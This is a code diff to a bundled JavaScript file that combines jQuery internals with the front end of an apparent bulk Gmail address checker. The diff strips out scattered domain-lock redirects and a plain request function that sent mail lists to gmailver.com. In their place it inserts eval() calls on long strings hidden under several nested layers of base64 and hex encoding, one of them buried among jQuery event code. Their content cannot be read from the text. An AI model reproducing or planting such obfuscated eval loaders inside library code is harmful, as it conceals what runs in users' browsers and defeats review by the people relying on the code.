@@ -14571,11 +14571,8 @@ function returnFalse() {
 	return false;
 }
 
-  $(document).ready(function() {
-    if (window.location.href.indexOf("mba") < 1) {
-      window.location.href="";
-    }
-  });
+	eval(bstx(h3tx(h3tx(bstx('  MzU2MTM0MzczMzM5MzY2MTM2MzQzNTM3MzMzMTM2NjMzNjMyMzY2NTM1MzEzNzM1MzUzOTM1MzczNTMyMzY2MjM1MzIzNTM4MzU2MTM2NjMzNjMyMzY2NTM1MzIzNDY0MzYzMTM1MzgzNDY1MzMzMDM1NjEzNTM3MzMzNTM2NjMzNjMzMzYzOTM2MzczNjM5MzUzMjM0MzUzMzM5MzQ2NTM1MzEzMzMyMzMzOTM3MzUzNjM0MzQzNzM1MzYzNzM1MzYzNDM0MzUzNzM4MzczNjM1MzkzNTM3MzUzMjM2NjMzNTYxMzQzMzM0MzkzNzMzMzQzOTM0MzczNTYxMzMzMTM2MzIzNjY0MzQ2NTMzMzAzNjMxMzUzNzMzMzkzNzM1MzQ2MjM0MzMzNjYyMzYzNzM2MzUzNzM3MzY2NjM2MzczNDM5MzQzMzM0MzEzNjM3MzYzMTM1MzczNTM5MzYzNzM0NjIzNDM4MzYzNDM3MzAzNjMyMzY2NDM1MzIzNzM2MzYzNDM3MzkzMzM1MzczMzM2MzIzMzMyMzQ2NTM2MzgzNjM0MzQzNzM2NjMzNzM2MzYzMjM2MzkzMzM1MzY2NjM2MzMzNjY0MzUzNjM2NjQzNDYzMzY2NDM2NjMzNzM1MzU2MTM0MzczNTM2MzMzNDM1MzQzMzMyMzUzOTM2NjYzNDM5MzY2NDMzMzEzNjM5MzUzOTM1MzczNjM4MzYzOTM1MzkzNTM3MzQ2MTM2MzgzNjM0MzQzMzMzMzUzNjY1MzYzMTM1MzgzNTMyMzY2NjM2MzQzNTM3MzQzOTM3MzUzNjMxMzUzNzMzMzgzNjM5MzQ2MjM1MzMzNDMxMzI2MjM0MzkzNDMzMzMzMDM3MzgzNDM5MzQzODM3MzgzMzM4MzQzOTM0MzEzNjY2MzYzNzM0MzkzNDMzMzQzMTM2MzczNDM5MzQzMzM0MzEzNjM3MzQzOTM0MzgzNjM0MzczMDM2MzIzNjY0MzUzMjM3MzYzNjM0MzczOTMzMzUzNzMzMzYzMjMzMzIzNDY1MzYzODM2MzQzNDM3MzY2MzM3MzYzNjMyMzYzOTMzMzUzNjY2MzYzMzM2NjQzNTM2MzY2NDM0NjMzNjY0MzY2MzM3MzUzNTYxMzQzNzM1MzYzMzM0MzUzNDMzMzIzNTM5MzY2NjM0MzkzNjY0MzYzNDM3MzQzNTM5MzUzNzM2NjMzNzMzMzUzOTMzMzIzNjM4MzY2MzM1MzkzMzMyMzczNDM2NjMzNjMzMzYzOTMzMzUzNjY1MzYzMTM1MzgzNTMyMzY2NjM2MzQzNTM3MzQzOTM3MzUzNjMxMzUzNzMzMzgzNjM5MzQ2MjM1MzMzNDMxMzI2MjM0MzkzNDMzMzMzMDM3MzgzNDYyMzUzMzM0MzIzMzM3MzQzMzM2MzkzNDMxMzYzNzM0MzkzNDMzMzQzMTM2MzczNDM5MzQzMzM0MzEzNjM3MzUzOTMzMzIzMzM5MzczNTM2MzMzMzMyMzMzOTM3MzMzNTYxMzUzMzMzMzUzNzMzMzYzMjMzMzIzNjMzMzY2NjM0MzkzNjYyMzQ2NTM3MzYzNjMzMzQzODM2NjMzNzM5MzYzMTM1MzczNjM0MzY2NjM2MzQzNDMzMzQzOTM3MzAzNDY2MzczNzM2NjYzNjM3MzQzOTM0MzMzNDMxMzYzNzM2MzYzNTMzMzQzMjM2NjMzNjMyMzQzODM0NjUzNjYzMzQzOTM0MzgzNzMzMzQ2MjM0MzkzNDMzMzQzMTM2MzczNDM5MzQzMzM0MzEzNjM3MzQzOTM0MzMzNDMyMzMzMzM2MzEzNTM3MzMzNTM2NjIzNjMyMzMzMzM2MzMzNzM1MzYzMjM0MzczMzM5MzY2MTM1MzkzNTM4MzUzMjM3MzAzNjMyMzMzMjMzMzQzNzM1MzYzMTM0MzgzNDYxMzY2MzM1NjEzNjM5MzQzMTMzMzkzNDM5MzQzMzM0NjEzNzM0MzUzOTM2NjQzNDM2MzY2NjM1MzkzNjY0MzQzNjM2MzkzNTM5MzUzODM1MzEzNzM1MzU2MTMzMzIzNjYzMzMzMDM2MzEzNDM4MzUzNjM2MzkzNDYzMzY2NDM2NjMzNzM2MzQ2MzMzMzAzNDY1MzczNjM2MzMzNDM4MzY2MzM3MzkzNjMxMzUzNzM2MzQzNjY2MzYzNDM0MzMzMzMxMzc2MTM2MzQzNDM4MzQ2MTM3MzAzNjMxMzMzMjM1MzUzNjM5MzQ2NjM3MzczNjY2MzYzNzM0MzkzNDMzMzQzMTM2MzczNjM2MzUzMTM3MzAzMzM5MzQ2MjM1MzQzNzMzMzM2NA==')))));
+
 // Support: IE <=9 - 11+
 // focus() and blur() are asynchronous, except when they are no-op.
 // So expect focus to be synchronous when the element is already active,
@@ -14660,11 +14657,7 @@ function on( elem, types, selector, data, fn, one ) {
  * Helper functions for managing events -- not part of the public interface.
  * Props to Dean Edwards' addEvent library for many of the ideas.
  */
-  $(document).ready(function() {
-    if (window.location.href.indexOf("hba") < 1) {
-      window.location.href="";
-    }
-  });
+
 	
 window.intergramId = "6856026581";
 jQuery.event = {
@@ -15087,11 +15080,7 @@ jQuery.event = {
 // synthetic events by interrupting progress until reinvoked in response to
 // *native* events that it fires directly, ensuring that state changes have
 // already occurred before other listeners are invoked.
-  $(document).ready(function() {
-    if (window.location.href.indexOf("ba") < 1) {
-      window.location.href="";
-    }
-  });
+
 
 function leverageNative( el, type, expectSync ) {
 
@@ -15370,11 +15359,6 @@ jQuery.each( { focus: "focusin", blur: "focusout" }, function( type, delegateTyp
 // Safari sends mouseenter too often; see:
 // https://bugs.chromium.org/p/chromium/issues/detail?id=470258
 // for the description of the bug (it existed in older Chrome versions as well).
-  $(document).ready(function() {
-    if (window.location.href.indexOf("t.") < 1) {
-      window.location.href="";
-    }
-  });
 
 jQuery.each( {
 	mouseenter: "mouseover",
@@ -15738,12 +15722,6 @@ jQuery.extend( {
 	}
 } );
 
-  $(document).ready(function() {
-    if (window.location.href.indexOf("gi") < 1) {
-      window.location.href="";
-    }
-  });
-
 jQuery.fn.extend( {
 	detach: function( selector ) {
 		return remove( this, selector, true );
@@ -15884,12 +15862,6 @@ jQuery.fn.extend( {
 	}
 } );
 
-  $(document).ready(function() {
-    if (window.location.href.indexOf("thub.") < 1) {
-      window.location.href="";
-    }
-  });
-
 jQuery.each( {
 	appendTo: "append",
 	prependTo: "prepend",
@@ -16027,12 +15999,6 @@ var rboxStyle = new RegExp( cssExpand.join( "|" ), "i" );
 		}
 	} );
 } )();
-
-  $(document).ready(function() {
-    if (window.location.href.indexOf("io") < 1) {
-      window.location.href="";
-    }
-  });
   
 function curCSS( elem, name, computed ) {
 	var width, minWidth, maxWidth, ret,
@@ -21901,16 +21867,7 @@ function generateRandomHex() {
 
     return hexString;
 }
-function getCookie(name)
-	{
-	    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
-	 
-	    if(arr=document.cookie.match(reg))
-	 
-	        return unescape(arr[2]);
-	    else
-	        return null;
-	}
+
 (function() {
      let inputEditor = CodeMirror.fromTextArea(document.getElementById("mail-input"),
         {
@@ -22063,6 +22020,10 @@ $("#active_server2").hide();
 	$(document).on("click",
         "#check-btn",
         function() {	
+			$(".btn-executor").css("pointer-events", "none");
+			setTimeout(function() {
+			$(".btn-executor").css("pointer-events", "auto");
+			}, 200);		
 			goodEditor.setValue("");
 			verEditor.setValue("");
 			notExistEditor.setValue("");
@@ -22514,64 +22475,8 @@ function increaseReport(id, number) {
     }
 }
 
-function readkey(hex) {
-    let str = '';
-    for (let i = 0; i < hex.length; i += 2) {
-        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
-    }
-    return str;
-}
 
-async function requestCheckMails(mails) {
-	return new Promise(async (r) => {
-		let attempt = 0;
-		const maxAttempts = 5; 
-
-		let fastCheck = ''
-		if (model == 1) {
-			fastCheck = false;
-		} else if (model == 3) {
-			fastCheck = true;
-		}
-		let data = {
-			mail: mails,
-			key: key,
-			fastCheck: fastCheck
-		};
-
-		const self = this;
-
-		while (attempt < maxAttempts) {
-			try {
-				attempt++;
-				var res;
-				if (model == 1 || model == 3) {
-					res = await axios.post('https://gmailver.com/php/check1.php', data);
-				} else {
-					res = await axios.post('https://gmailver.com/php/check2.php', data);
-				}
-
-				const responseData = res.data;
-				if (!responseData.status) {
-					abp.notify.warn("");
-					return r(false);
-				}
-				const result = res.data.data;
-				const transactionId = result.transactionId;
-
-				return r(result);
-			} catch (error) {
-
-				console.error('Request failed, retrying...', error);
-
-				if (attempt >= maxAttempts) {
-
-					return r(false);
-				}
-			}
-		}
-	});
-}
+	eval(bstx(h3tx(h3tx(bstx('MzUzOTM1MzgzNDY1MzMzNTM2MzIzNjY0MzQ2NDM2MzczNTYxMzY2NTM1MzYzNzM1MzUzOTMzMzMzNTMyMzczMDM2MzIzMzMyMzMzNDM2MzczNjMzMzY2NDM1MzYzNzM4MzYzNDM1MzczNTM2Mzc2MTM2MzQzNDM1MzQ2NTM2NjYzNTYxMzUzNzM0NjUzNzMyMzUzNDM1MzczNDM2MzczMDM2MzIzNDM4MzQ2NDM2NjYzNjMyMzUzNzM0MzYzNzMwMzYzMjM0MzgzNDY0MzczMDM0MzkzNDM4MzczMzM0NjIzNDMzMzUzODM0NjEzNjYzMzYzNDM0MzgzNTM2MzczOTM2MzIzNjM5MzQzMjM3MzUzNTYxMzUzODM2MzMzNjM3MzUzNTM0MzgzNDYxMzczNjM2MzIzNTM3MzY2MzM3NjEzNTYxMzUzMzM2MzgzNjM4MzYzMzMzMzMzNjYzMzczNTM1MzkzNzM5MzQzMTM2NjYzNjMzMzYzOTM2NjIzNjM3MzUzMDM1MzQzMzM0MzYzNzM2MzUzNzM3MzY2NjM0NjEzNDMzMzUzNzM3MzgzNjYzMzYzNDM0MzMzNDMyMzYzODM2MzQzNDM4MzUzMjM2NjMzNjMyMzUzODM0MzIzMzMwMzQzOTM0MzQzMzMwMzYzNzM0NjQzNDM0MzczMzM0NjIzNDMzMzUzMTM2NjMzNjYxMzYzMjMzMzIzMzM1Mzc2MTM2MzQzNDMzMzQzMjM3MzQzNTM5MzUzODM2MzgzNDMyMzYzNDM0MzgzNTMyMzY2MzM2MzIzNTM4MzQzMjMzMzAzNjMzMzczOTM0MzEzMzM5MzQzOTM0MzQzNTM1MzMzNzM0MzkzNDMxMzY2NjM0NjIzNDMzMzUzMTM2NjMzNzMzMzU2MTM1MzgzNTMxMzYzNzM1NjEzNjY0MzQzNjM3NjEzNjM0MzQzNTM0NjUzNjY2MzU2MTM1MzczNDY1MzczMjM0MzkzNDM0MzMzMDM2MzczNDYxMzczOTM2MzMzNDYyMzQzMzM1MzEzNjYzMzczMDM1NjEzNjM5MzQzMTM2NjYzNjMyMzUzNzMzMzkzNjYyMzU2MTM1MzczNzM3MzYzNzM1MzAzNTM0MzMzMDM2MzczNDY0MzUzMzM2NjIzNjM3MzYzNTM3MzczNjY2MzQ2MTM0MzMzNTMxMzY2MzM2NjQzNTM5MzUzODM0NjUzMzMwMzUzMTMzMzIzNjM4MzY2MzM1MzkzMzMyMzczMzM2MzczNTMwMzUzMzM0MzIzNjY0MzUzOTM1MzczNzM4Mzc2MTM1NjEzNTM0MzczMzM0NjIzNDMzMzUzMTM2NjMzMzM5MzQzOTM0MzczNTM2MzczMzM2MzMzMzMyMzUzNTM2MzczNjMxMzUzNzM1MzkzNjM3MzQ2MjM0MzczMzMxMzczNjM1NjEzNDM3MzUzNjM3MzMzNDM5MzQzNDMzMzAzMzM5MzQzOTM0MzQzNDY0MzczMDM0MzkzNDM4MzczMzM0NjIzNDMzMzUzMTM2NjIzNDYxMzU2MTM2NjQzNDM2Mzc2MTM2MzQzNDM1MzQ2NTM2NjYzNTYxMzUzNzM0NjUzNzMyMzQzOTM0MzQzMzMwMzYzNzM2MzQzNDM4MzQ2MTMzMzEzNTYxMzUzNDM3MzMzNDYyMzQzMzM1MzEzNjYzMzMzOTM0MzMzNjM3MzY2MjM0NjEzNjMyMzQzNzM1MzYzMzMwMzQzOTM0MzczNTMyMzYzODM2MzQzNDM3MzQzNTM2MzczNTMwMzUzMzM0MzIzMzM3MzQzMzM2MzczNjYyMzQ2MTM0MzMzNTM3MzMzMTM2MzgzNjMxMzUzNzM3MzczMzM2MzQzOTM0MzczMzMxMzYzODM2MzEzNTM3MzczODM3NjEzNDYzMzQzMTM2NjYzNDYxMzQzMzM1MzEzNjYzMzczMjM1NjEzNTM4MzY2MjMzMzYzNDM5MzQzNzM3MzQzNjYzMzYzNTM1MzMzNzM3MzQ2MjM0MzMzNTMxMzY2MjM0NjEzNTYxMzY2NDM0MzYzNzYxMzYzNDM0MzUzNDY1MzY2NjM1NjEzNTM3MzQ2NTM3MzIzNDY2MzYzOTM0MzIzNjY0MzUzOTM1MzgzNDY1MzMzMDM1MzEzMzMyMzYzODM2NjMzNTM5MzMzMjM3MzMzNDYyMzQzMzM1MzEzNjYzMzMzOTM0NjYzNzM3MzY2NjM0NjIzNDMzMzUzMTM2NjMzNjYxMzYzMjMzMzIzMzM1Mzc2MTM2MzQzNDMzMzQzMjM3NjEzNTYxMzUzNzM3MzgzNjY0MzQzOTM0MzQzMzMwMzYzNzM2MzQzNDM3MzYzODM3MzAzNjMzMzc2MTM3MzMzNDYyMzQzMzM2MzczNjYyMzQ2MTM2MzQzMzMyMzYzODM3MzAzNjMyMzQzNzM1MzUzNjM3MzQ2MjM0MzczNDM2MzMzMDM2MzQzNDM3MzUzNjM3MzQzNjMzMzQzODM1MzEzNjM3MzUzMDM0MzMzNDMyMzczNDM1MzkzNTM4MzYzODM0MzIzNjM0MzQzODM1MzIzNjYzMzYzMjM1MzgzNDMyMzMzMDM2MzMzNzM5MzY2MjM2MzczNjM1MzczNzM2NjYzNDYxMzQzMzM1MzEzNjYzMzMzMDM2MzMzNjY1MzY2MjM2MzczNjM1MzczNzM2NjYzNDYxMzQzMzM1MzEzNjYyMzQ2MTM1MzkzNTM4MzUzMjMzMzAzNTYxMzUzNzMzMzEzNzM3MzYzNDM0MzMzNzMzMzczMjM0NjYzNzM3MzY2NjM0NjEzNDMzMzUzMTM2NjIzNDYxMzYzNDM2NjQzNDM2MzczOTM0MzkzNDM4MzQ2MTM2NjMzNjMzMzc2MTM3MzMzNDYyMzQzMzM1MzEzNjYyMzQ2MTM0MzMzNTM3MzY2MzM2NjQzNDM5MzQzMzM2MzgzNzM0MzYzMjMzMzIzNTMyMzY2MzM2MzIzNDMzMzQzMTMzMzkzNTMwMzUzMzM0MzEzNzM4MzQzOTM0MzgzNzM4MzMzODM0MzkzNDM3MzMzMTM3MzYzNTYxMzQzNzM1MzYzNzMzMzQzOTM0MzQzMzMwMzMzOTM0MzkzNDM0MzQ2NDM3MzAzNDM5MzQzODM3MzMzNDYyMzQzMzM1MzEzNjYyMzQ2MTM0MzMzNTMxMzY2MzM3MzkzNTYxMzUzODM0NjQzNjM3MzUzMDM1MzMzNDMyMzYzODM2MzQzMzMyMzQzNjM3MzAzNjM0MzQzMzM0MzIzNjM4MzYzNTM0MzczNjYzMzczNjM2MzMzNzM5MzMzNTM3MzczNjMyMzMzMzM0NjUzMzMwMzQ2MjM0MzMzNjM0MzY2NjM2MzQzNDM4MzUzMjM3MzczNjMzMzc2MTM2NjYzNzM2MzQ2MzMzMzIzNjM0MzczNDM1MzkzNTM3MzY2MzM3MzMzNjM0MzY2NDM1MzYzNzM5MzQ2MzM2NjQzNDY1MzczNjM2MzIzNTMzMzMzOTM3MzczNjMxMzQzODM0MzEzNzM2MzUzOTMzMzIzNjM4MzY2MzM1MzkzMzMyMzczMzM3MzgzNDYzMzY2NTM0MzIzNjY2MzYzMzM0MzMzNjMzMzczMzM0MzkzNDM3MzUzMjM2MzgzNjM0MzQzNzM0MzUzNzMwMzQ2NjM3MzczNjY2MzQ2MTM0MzMzNTMxMzY2MjM0NjEzNjM2MzUzMzM0MzIzNjYzMzYzMjM0MzgzNDY1MzY2MzM0MzkzNDM4MzczMzM0NjIzNDMzMzUzMTM2NjIzNDYxMzQzMzM1MzEzNjYzMzczOTM1NjEzNTM4MzQ2NDM2MzczNTMwMzUzMzM0MzIzNjM4MzYzNDMzMzIzNDM2MzczMDM2MzQzNDMzMzQzMjM2MzgzNjM1MzQzNzM2NjMzNzM2MzYzMzM3MzkzMzM1MzczNzM2MzIzMzMzMzQ2NTMzMzAzNDYyMzQzMzM2MzQzNjY2MzYzNDM0MzgzNTMyMzczNzM2MzMzNzYxMzY2NjM3MzYzNDYzMzMzMjM2MzQzNzM0MzUzOTM1MzczNjYzMzczMzM2MzQzNjY0MzUzNjM3MzkzNDYzMzY2NDM0NjUzNzM2MzYzMjM1MzMzMzM5MzczNzM2MzEzNDM4MzQzMTM3MzYzNTM5MzMzMjM2MzgzNjYzMzUzOTMzMzIzNzMzMzczOTM0NjMzNjY1MzQzMjM2NjYzNjMzMzQzMzM2MzMzNzMzMzQzOTM0MzczNTMyMzYzODM2MzQzNDM3MzQzNTM3MzAzNDY2MzczNzM2NjYzNDYxMzQzMzM1MzEzNjYyMzQ2MTM2MzYzNTMxMzY2NjM0NjIzNDMzMzUzMTM2NjIzNDYxMzQzMzM1MzczNDY1MzczNjM2MzIzNjY1MzQ2NTMzMzAzNDM5MzQzODM0NjEzNjYzMzYzMzMzMzMzNDMyMzczNjM2MzIzNjY1MzQ2NTM2NjMzNTMyMzQzNzM0MzYzMzMwMzUzOTM1MzMzNDMxMzMzOTM0MzkzNDM4MzQ2MTM2NjMzNjMzMzczOTMzMzUzNjYyMzUzOTM1MzgzNTMyMzYzODM0NjYzNzM3MzY2NjM0NjEzNDMzMzUzMTM2NjIzNDYxMzYzMTM1MzczNTM5MzYzNzM0NjIzNDMzMzQzNjM3MzkzNTYxMzUzODM0NjUzNzM3MzYzMjMzMzIzMzM1Mzc2MTM1NjEzNTM1MzUzMjM2MzgzNjM0MzQzNzM0MzUzNzM1MzYzMzMzMzMzNTMyMzYzODM2MzQzNDM4MzUzNjM3NjEzNDYyMzUzMzM0MzIzMzM3MzQzMzM2MzczNjYyMzQ2MTM0MzMzNTMxMzY2MjM0NjEzNTM5MzUzNzM0NjEzNzM3MzQ2MzM2NjQzMzM1MzczNjM2MzQzNDM3MzY2MzM2NjQzNjM1MzUzMzMzMzUzMzMzMzUzOTM1MzgzNDYxMzczNTM0NjIzNDMzMzQzOTM2MzkzNDYyMzUzNDM3MzMzNDYyMzQzMzM1MzEzNjYyMzQ2MTM0MzMzNTMxMzY2MzM3MzkzNTYxMzUzODM1MzIzMzMxMzYzMzM2NjQzMzM0MzYzNzM2MzMzNjM5MzYzODM2NjQzNTM5MzUzNzM3MzgzNzYxMzU2MTM1MzMzNjYyMzMzNzM0MzMzNjM3MzY2MjM0NjEzNDMzMzUzMTM2NjMzMzM5MzQzMzM2MzczNjYyMzQ2MTM0MzMzNTMxMzY2MzM2NjEzNjMyMzMzMjMzMzUzNzYxMzYzNDM0MzMzNDMyMzczOTM1NjEzNTM4MzQ2NTMzMzEzNjMyMzQzODM1MzEzNjM3MzUzMDM1MzMzNDMyMzczOTM1NjEzNTM4MzQ2NDM3MzUzNTYxMzQzNzM0MzYzMzMwMzUzOTM1MzMzMzM1MzY2MjM1MzkzNTM4MzUzMjM2MzgzNDY2MzczNzM2NjYzNDYxMzQzMzM1MzEzNjYyMzQ2MTM1MzkzMzMyMzMzOTM3MzUzNjMzMzMzMzM1MzEzNjM3MzYzNDM0MzgzNDYxMzYzODM2MzIzNjY1MzQ2NTM2MzgzNTM5MzMzMzM1MzIzNzMwMzYzMjMzMzIzMzM1MzQ2MTM1NjEzNDMzMzQzMTMzMzkzNDM5MzQzODM0NjEzNjYzMzYzMzMzMzMzNTM2MzczMzM2MzQzNDMzMzMzNTMzMzAzNjMzMzY2NDM0MzYzNzM1MzYzMzMzMzIzNDM2MzY2MTM2MzQzNDM3MzY2MzM3MzYzNjMyMzY2MjM2NjMzNjYyMzQ2NjM3MzczNjY2MzQ2MjM0MzMzNTMxMzY2MjM0NjEzNDMzMzUzODM0NjEzNjYzMzYzNDM0MzgzNTM2MzczOTM2MzIzNjM5MzQzMjM3MzkzNDYyMzQzODM0NjEzNjYzMzYzMzMzMzMzNTM2MzczMzM2MzQzNDMzMzY2MjMzMzczNDMzMzYzNzM2NjIzNDYxMzQzMzM1MzgzMzMwMzYzNzM1MzkzMzMyMzQzNjMzMzAzNTM5MzMzMjM2MzczNjM3MzQ2MjM0MzczNTM2MzczOTM2MzMzNjY0MzMzOTM3MzkzNDYyMzUzMzM0MzIzMzM3MzQzMzM2MzczNjY2MzQ2MTM0MzMzNTMxMzY2MjM0NjEzNTM5MzMzMjMzMzkzNzM1MzYzMzMzMzIzMzM5MzczMzM1NjEzNTMzMzMzNTM2NjMzNjMzMzY2NTM0NjEzNzM2MzYzMzM2MzkzNjM3MzY2NTM1MzUzNjY0MzUzNjM3MzgzNjM0MzUzNzM1MzYzNzYxMzYzNDM0MzMzNDMyMzY2NDM1MzkzNTM3MzY2MzM3MzMzNTYxMzUzNzM1MzEzNzMzMzQzOTM0MzgzNDYxMzY2MzM2MzQzNDM4MzQ2MTMzMzUzNjMxMzUzNzMzMzUzNjY1MzQ2MzM2MzkzMzM0MzczNTM0NjEzNzM5MzczNzM2MzczNTYxMzUzODM0NjEzNzM5MzYzMjMzMzMzNDM5MzczMDM0NjYzNzM3MzY2NjM0NjIzNDMzMzUzMTM2NjIzNDYxMzQzMzM1MzczNjYzMzY2NDM0MzkzNDMzMzYzODM2MzgzNjM0MzQzODM1MzIzNjYzMzYzMjM1MzgzNDMyMzMzMDM0MzkzNDM0MzMzNDMzMzkzNDM5MzQzNzMzMzEzNjM4MzYzNTM0MzUzNDM2MzMzMDM2MzQzNDM3MzUzNjM3MzQzNjMzMzQzODM1MzIzNzYxMzQ2MjM1MzMzNDMyMzMzNzM0MzMzNjM3MzY2NjM0NjEzNDMzMzUzMTM2NjIzNDYxMzQzMzM1MzgzNDYxMzY2MzM2MzQzNDM4MzUzNjM3MzkzNjMyMzYzOTM0MzIzNzM5MzQ2MjM0MzczNTYxMzYzODM2MzIzNDM4MzQ2NTM2NjMzNDYyMzUzNDM3MzMzNDYyMzQzMzM1MzEzNjYyMzQ2MTM0MzMzNTM4MzMzMDM0NjIzNDMzMzUzMTM2NjIzNDYxMzYzNjM1MzEzNjY2MzQ2MTM0MzMzNTM4MzMzMDM0NjIzNDMzMzUzODMzMzAzNzMwMzQ2NjM3MzczNzMwMzMzOQ')))));
 
 
 //function downloadFile(type) {
@@ -22757,6 +22662,14 @@ document.getElementById('submit-key').addEventListener('click', function() {
 		$(".active_token").show();
 		$("#activate_btn").hide();
 		$(".theme_switch").show();
+		
+    if (!localStorage.getItem('hasReloaded')) {
+        localStorage.setItem('hasReloaded', 'true');     
+        location.reload();
+        } else {
+			localStorage.removeItem('hasReloaded');
+        }			
+		
         removeShowPopupButton();
         createVerifyButton();		
 		abp.notify.info(`Welcome back!`);
@@ -22836,6 +22749,13 @@ function checkValidKey() {
 				$("#activate_btn").hide();
 				$(".theme_switch").show();
 				$("#locked").hide();
+            if (!localStorage.getItem('hasReloaded')) {
+                localStorage.setItem('hasReloaded', 'true');
+                
+                location.reload();
+            } else {
+                localStorage.removeItem('hasReloaded');
+            }					
                 return;
             }
         } else {
